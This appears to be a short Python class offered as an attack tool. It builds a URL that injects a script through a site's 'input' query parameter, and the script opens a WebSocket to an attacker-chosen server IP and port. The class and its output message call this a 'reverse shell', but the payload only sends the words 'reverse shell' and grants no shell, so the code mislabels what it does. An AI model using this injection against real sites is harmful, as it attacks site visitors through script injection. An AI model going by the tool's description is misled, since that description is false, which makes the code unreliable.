class WebShellReverseShell:
    def __init__(self):
        pass

    def create_reverse_shell(self, url, server_ip, server_port):
        payload = f"<script>var socket = new WebSocket('ws://{server_ip}:{server_port}');socket.onopen=function(){{socket.send('reverse shell');}}</script>"
        webshell_url = f"{url}?input={payload}"
        print(f"WebShell reverse shell created at: {webshell_url}")
        return webshell_url
